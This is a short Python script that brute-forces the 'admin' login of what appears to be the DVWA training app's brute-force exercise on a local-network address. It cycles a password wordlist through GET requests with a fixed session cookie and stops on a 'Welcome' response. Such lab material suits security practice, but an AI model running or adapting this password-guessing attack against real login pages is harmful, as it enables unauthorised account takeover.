import requests
from bs4 import BeautifulSoup as bs

security="low"
password_file="/tmp/fasttrack.txt"
url='http://192.168.1.163:8082/vulnerabilities/brute/'

cookies = {'security':security,
           'PHPSESSID':'9no6gmk1eqr2dps9lccqic71t5'
           }

with open(password_file,'r') as f:
    passwords = f.readlines()

def payloads(passwords=passwords):
    payload = []
    for password in passwords:
        payload.append({'username':'admin','password':password.rstrip(),'Login':'Login'})

    return payload
    
def testPasswords():
    pay = payloads()
    for payload in pay:
        r = createSession(payload)
        if "Welcome" in r.text:
          print("Sucess with :", r.url)
          quit()

def createSession(payload,security=security,url=url,cookies=cookies):
    if security == "low":
      s = requests.Session()
      r = s.get(url, cookies=cookies,params=payload)

    return r
    
testPasswords()
